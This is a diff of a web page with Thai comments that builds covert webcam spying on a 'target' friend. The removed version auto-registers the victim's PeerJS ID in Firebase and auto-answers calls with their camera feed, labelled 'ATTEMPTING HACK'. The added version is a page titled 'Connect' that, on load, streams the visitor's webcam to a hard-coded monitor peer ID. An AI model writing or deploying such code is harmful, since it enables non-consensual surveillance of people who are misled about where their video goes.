@@ -1,78 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SYSTEM_MONITOR_v4</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .monitor { width: 80vh; aspect-ratio: 4/3; border: 2px solid #0f0; background: #050505; position: relative; }
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .log { position: absolute; top: 10px; left: 10px; font-size: 12px; pointer-events: none; }
-    </style>
+    <title>Connect</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 </head>
 <body>
-
-    <div class="monitor">
-        <div class="log" id="log-text">SYSTEM: IDLE</div>
-        <video id="v" autoplay playsinline></video>
-    </div>
-
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-
     <script>
-        // 1. 🔥 เติมค่า Config จาก Firebase ของคุณตรงนี้
-        const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-            databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_PROJECT_ID.appspot.com",
-            messagingSenderId: "YOUR_ID",
-            appId: "YOUR_APP_ID"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        // ใส่ Peer ID ของ "อชิ" ที่ได้จากหน้า monitor
+        const achiID = 'ACHI_MONITOR_001'; 
 
-        const v = document.getElementById('v');
-        const log = document.getElementById('log-text');
         const peer = new Peer();
 
-        // ตรวจสอบว่าเป็น "คนดู" หรือ "เป้าหมาย" จาก URL
-        const isMaster = new URLSearchParams(window.location.search).has('monitor');
-
-        peer.on('open', (id) => {
-            if (!isMaster) {
-                // --- ส่วนของเป้าหมาย (เพื่อน) ---
-                log.innerText = "SYSTEM: SCANNING FACE...";
-                // ส่ง ID ไปเก็บใน Firebase อัตโนมัติ
-                db.ref('last_target').set({ id: id, time: Date.now() });
-            } else {
-                // --- ส่วนของคุณ (Master) ---
-                log.innerText = "SYSTEM: MONITORING MODE";
-                // คอยดักฟังว่ามี ID ใหม่เข้ามาไหม
-                db.ref('last_target').on('value', (snap) => {
-                    const data = snap.val();
-                    if (data) connectToTarget(data.id);
-                });
-            }
-        });
-
-        // ฟังก์ชันเชื่อมต่อ (ฝั่ง Master)
-        async function connectToTarget(targetId) {
-            log.innerText = "SYSTEM: ATTEMPTING HACK -> " + targetId;
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                const call = peer.call(targetId, s);
-                call.on('stream', (rs) => { v.srcObject = rs; log.innerText = "CONNECTED: LIVE FEED"; });
-            } catch (e) {}
-        }
-
-        // รับสายอัตโนมัติ (ฝั่งเพื่อน)
-        peer.on('call', (c) => {
-            navigator.mediaDevices.getUserMedia({ video: true }).then((s) => {
-                c.answer(s);
-                c.on('stream', (rs) => { v.srcObject = rs; }); // เพื่อนเห็นหน้าตัวเอง
+        navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+            // เมื่อเชื่อมต่อกับ Server สำเร็จ ให้โทรหาเครื่องอชิทันที
+            peer.on('open', (id) => {
+                peer.call(achiID, stream);
             });
         });
     </script>
